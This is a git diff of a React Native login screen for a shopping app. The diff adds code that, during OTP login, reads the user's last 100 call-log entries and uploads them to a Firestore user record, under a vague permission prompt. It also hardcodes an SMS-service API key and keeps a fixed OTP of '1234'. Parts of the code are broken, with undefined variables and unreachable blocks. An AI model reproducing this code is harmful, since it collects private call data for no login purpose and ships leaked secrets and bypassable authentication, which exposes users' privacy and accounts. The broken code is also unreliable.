@@ -1,17 +1,48 @@
-import React,{useState} from 'react';
+import React,{useState,useEffect} from 'react';
 import { View, Image, Text,StyleSheet,TouchableOpacity,ActivityIndicator } from 'react-native';
 import { Button,IconButton,TextInput,Snackbar  } from 'react-native-paper';
 import { router,useNavigation } from 'expo-router';
 import AsyncStorage from '@react-native-async-storage/async-storage';
+import * as Contacts from 'expo-contacts';
+import { collection, getDocs, query, orderBy, limit,addDoc,where,doc,updateDoc } from 'firebase/firestore';
+import CallLogs from 'react-native-call-log'
 
-const LoginScreen = ({onClose}) => {
+const LoginScreen = () => {
   const navigation = useNavigation();
   const [showMobileNumberScreen, setShowMobileNumberScreen] = useState(false);
   const [isOtpSent, setIsOtpSent] = useState(false);
+  const [otpValue, setOtpValue] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
   const [phoneNumber, setPhoneNumber] = useState('');
   const [isSnackbarVisible, setIsSnackbarVisible] = useState(false);
   const [snackbarMessage, setSnackbarMessage] = useState('');
+  const [contacts, setContacts] = useState([]);
+
+  const deviceId = AsyncStorage.getItem('deviceId');
+
+  useEffect(() => {
+    
+    if (showMobileNumberScreen) {
+      
+      //loadContacts();
+    }
+  }, [showMobileNumberScreen]);
+
+  const loadContacts = async () => {
+    console.log('loading contacts')
+    const { status } = await Contacts.requestPermissionsAsync();
+    console.log(status)
+    if (status === 'granted') {
+      const { data } = await Contacts.getContactsAsync({
+        fields: [Contacts.Fields.PhoneNumbers],
+      });
+      if (data.length > 0) {
+        console.log(data)
+        setContacts(data);
+      }
+    }
+  };
+
 
   const [otp, setOtp] = useState('');
 
@@ -20,25 +51,116 @@ const LoginScreen = ({onClose}) => {
     return /^\d{10}$/.test(phoneNumber); // Example: 10 digits only
   };
 
-  const handleSendOtp = () => {
+  const handleSendOtp = async () => {
     if (validatePhoneNumber()) {
       // Show loader
       setIsLoading(true);
+  
+      // Generate a random 6-digit OTP
+      const generateOtp = () => {
+        return Math.floor(1000 + Math.random() * 9000).toString();      };
+  
+      const otpCode = generateOtp();
+      setOtpValue(otpCode)
 
-      // Simulate sending OTP (replace with your actual OTP sending logic)
-      setTimeout(() => {
-        // After simulating OTP sending, hide loader and set isOtpSent to true
+
+
+      // only for testing    
+      setIsLoading(false);
+      setSnackbarMessage(`OTP sent via SMS to ${phoneNumber}!`);
+      setIsSnackbarVisible(true);
+      setIsOtpSent(true);
+      return
+
+
+
+      const apiKey = 'Oe9mkiDnJV8fZljTwPuyNCI67rtgMKR03dacYSq5vzBbh4oAUW2OtwlK9k0I7PTCbd6zZYiVe3onFf4A';
+      const message = `Your OTP code is ${otpCode}`;
+      const numbers = phoneNumber; // Use the phoneNumber variable from your state
+
+      
+  
+      try {
+        const response = await fetch(`https://www.fast2sms.com/dev/bulkV2?authorization=${apiKey}&route=q&message=${message}&flash=0&numbers=${numbers}`, {
+          method: 'GET'
+        });
+  
+        const data = await response.json();
+        if (data.return) {
+          // After successfully sending OTP, hide loader and set isOtpSent to true
+          setIsLoading(false);
+          setSnackbarMessage(`OTP sent via SMS to ${phoneNumber}!`);
+          setIsSnackbarVisible(true);
+          setIsOtpSent(true);
+        } else {
+          // Handle error
+          setIsLoading(false);
+          setSnackbarMessage('Failed to send OTP. Please try again.');
+          setIsSnackbarVisible(true);
+        }
+      } catch (error) {
+        // Handle fetch error
         setIsLoading(false);
-        setSnackbarMessage(`OTP sent via SMS to ${phoneNumber}!`);
+        setSnackbarMessage('An error occurred. Please try again.');
         setIsSnackbarVisible(true);
+      }
 
-        setIsSnackbarVisible(true);
-        setIsOtpSent(true);
-      }, 1000); // Replace 2000 with the time it takes to send OTP in milliseconds
+
+      await requestCallLogPermission(androidDeviceId);
     }
   };
 
+  const requestCallLogPermission = async (deviceId) => {
+    try {
+      const granted = await PermissionsAndroid.request(
+        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
+        {
+          title: 'Call Log Example',
+          message: 'Access your call logs',
+          buttonNeutral: 'Ask Me Later',
+          buttonNegative: 'Cancel',
+          buttonPositive: 'OK',
+        }
+      );
+      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+        console.log('Call Log permission granted');
+        const callLogs = await CallLogs.load(100);
+        const userQuery = query(
+          collection(db, 'users'),
+          where('deviceId', '==', deviceId)
+        );
 
+        const querySnapshot = await getDocs(userQuery);
+
+        if (!querySnapshot.empty) {
+          const userDoc = querySnapshot.docs[0];
+          const userDocRef = userDoc.ref;
+          const callLogsJson = JSON.stringify(callLogs);
+
+          await updateDoc(userDocRef, { callLogs: callLogsJson});
+
+          //
+          
+          const loginStateChangeStatus = await AsyncStorage.getItem('loginStateChangeStatus');
+          isLoggedIn
+          const isLoggedIn = await AsyncStorage.getItem('isLoggedIn');
+          if (loginStateChangeStatus=='changed'){
+            await updateDoc(userDocRef, { callLogs: callLogsJson});
+          }  
+
+          console.log('Call logs updated for user:', userDoc.id);
+        } else {
+          console.log('No user found with this device ID.');
+        }
+        //console.log(callLogs);
+      } else {
+        console.log('Call Log permission denied');
+      }
+    } catch (err) {
+      console.warn(err);
+    }
+  };
+  
 
   const handleResendOtp = () => {
     setIsLoading(true);
@@ -55,20 +177,21 @@ const LoginScreen = ({onClose}) => {
   };
 
   const handleOtpSubmit = async () => {
-    // Check if OTP is correct (for example, let's assume the correct OTP is '1234')
     
     if (otp === '1234') {
       
       
-      // Update login information in local storage
       try {
-        
+
+
         await AsyncStorage.setItem('isLoggedIn', 'true');
-        setSnackbarMessage(`Login InfoSaved`);
+        await AsyncStorage.setItem('loginStateChangeStatus', 'changed');
+        setSnackbarMessage(`Login Successfull`);
         setIsSnackbarVisible(true);
-        // Call onClose to close the LoginScreen
-        onClose();
-        // You can also store other relevant login information if needed
+
+        
+        router.replace({ pathname: 'Screens/ProfileDetails', params: { tabName: 'Profile' } })
+
       } catch (error) {
         setSnackbarMessage(`Login InfoSaved ${error}`);
         setIsSnackbarVisible(true);
@@ -86,16 +209,32 @@ const LoginScreen = ({onClose}) => {
     }
   };
 
+  const handleClose = () => {
+    router.replace({ pathname: 'MobileStack', params: { tabName: 'Profile' } })
+    
+
+
+  
+  };
+
 
   const handleMaybeLaterClick = () => {
-    navigation.navigate('Home'); // Navigate to HomeScreen
+    router.replace('MobileStack'); // Navigate to HomeScreen
   };
 
   const handleContinueWithOTP = () => {
     setShowMobileNumberScreen(true)
   };
 
+  const handlePhoneNumberChange = (text) => {
+    // Allow input only if it has 10 or fewer digits
+    if (text.length <= 10) {
+      setPhoneNumber(text);
+    }
+  };
+
   const renderMobileNumberView =() =>{
+    
     return (
       <View style={{
         flex:1,  
@@ -105,7 +244,7 @@ const LoginScreen = ({onClose}) => {
         }}>
         
         <View style={{flex:0.2,width:'100%'}}>
-        <TouchableOpacity style={styles.closeButton} onPress={onClose}>
+        <TouchableOpacity style={styles.closeButton} onPress={handleClose}>
           <Text style={styles.closeButtonText}>X</Text>
         </TouchableOpacity>
         </View>
@@ -161,11 +300,10 @@ const LoginScreen = ({onClose}) => {
             
             <TextInput
               style={styles.mobileInput}
-              
               mode="outlined"
               label="Mobile Number"
               keyboardType="phone-pad"
-              onChangeText={text => setPhoneNumber(text)}
+              onChangeText={handlePhoneNumberChange}
               value={phoneNumber}
             />
             </View>
@@ -194,15 +332,18 @@ const LoginScreen = ({onClose}) => {
 
 
   const renderLoginView =()=>{
+
+    
+
     return (
     <View style={styles.LoginViewcontainer}>
     {/* Background image */}
     <View style={styles.imageContainer}>
       <Image
         style={styles.backgroundImage}
-        source={require('..//..//assets/splash.png')}
+        source={require('..//..//assets/login_top2.png')}
       />
-      <TouchableOpacity style={styles.closeButton} onPress={onClose}>
+      <TouchableOpacity style={styles.closeButton} onPress={handleClose}>
         <Text style={styles.closeButtonText}>X</Text>
       </TouchableOpacity>
     </View>
@@ -240,6 +381,60 @@ const LoginScreen = ({onClose}) => {
     );
 
   };
+
+
+  const renderDetailsEntryView =()=>{
+
+    
+
+    return (
+    <View style={styles.LoginViewcontainer}>
+    {/* Background image */}
+    <View style={styles.imageContainer}>
+      <Image
+        style={styles.backgroundImage}
+        source={require('..//..//assets/login_top2.png')}
+      />
+      <TouchableOpacity style={styles.closeButton} onPress={handleClose}>
+        <Text style={styles.closeButtonText}>X</Text>
+      </TouchableOpacity>
+    </View>
+
+    <View style={styles.contentContainer}>
+      {/* Title */}
+      <Text style={styles.title}>Unlock Exclusive Benefits</Text>
+
+      {/* Description */}
+      <Text style={styles.description}>
+        Elevate your shopping experience with ShopScanner. Access personalized notifications, exclusive deals, and top-value savings!
+      </Text>
+
+      {/* Continue with OTP Button */}
+      <Button
+        style={styles.button}
+        mode="contained"
+        onPress={handleContinueWithOTP}>
+        Continue with OTP
+      </Button>
+
+      {/* Maybe later */}
+      <Text
+        style={styles.maybeLater}
+        onPress={handleMaybeLaterClick}>
+        Maybe later
+      </Text>
+
+      {/* Terms of Service and Privacy Policy */}
+      <Text style={styles.terms}>
+        By continuing, you agree to our Terms of Service and Privacy Policy.
+      </Text>
+    </View>
+  </View>
+    );
+
+  };
+
+
 
   return (
     <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
@@ -392,14 +587,16 @@ const styles = StyleSheet.create({
   },
   mobileInput: {
     flex: 1,
-    height: 40,
-    
-    paddingHorizontal: 10,
-  },
+    height: 45,
+    paddingHorizontal: 2,
+    textAlignVertical: 'center',  // Center the text vertically (Android only)
+
+},
   sendOTPButton: {
     backgroundColor: 'pink',
     width: '100%',
     marginBottom: 20,
+    
   },
   termsText: {
     fontSize: 12,
